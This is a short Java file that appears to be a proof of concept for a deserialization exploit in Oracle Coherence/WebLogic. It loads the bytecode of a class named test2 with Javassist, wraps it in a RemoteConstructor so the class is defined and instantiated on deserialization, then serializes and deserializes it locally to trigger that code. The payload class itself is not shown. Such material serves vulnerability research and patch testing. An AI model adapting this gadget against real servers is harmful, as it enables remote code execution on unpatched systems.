package com.kami;
import java.lang.ClassNotFoundException;
import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;


import java.io.IOException;


public class APP2 {
    public static void main(String[] args) throws NotFoundException, IOException, ClassNotFoundException, CannotCompileException {

        ClassIdentity classIdentity = new ClassIdentity(test2.class);
        ClassPool cp = ClassPool.getDefault();
        CtClass ctClass = cp.get(test2.class.getName());
        ctClass.replaceClassName(test2.class.getName(), test2.class.getName() + "$" + classIdentity.getVersion());
        RemoteConstructor constructor = new RemoteConstructor(
                new ClassDefinition(classIdentity, ctClass.toBytecode()),
                new Object[]{}
        );
        byte[] obj = Serializables.serialize(constructor);
        Serializables.deserialize(obj);


    }

}
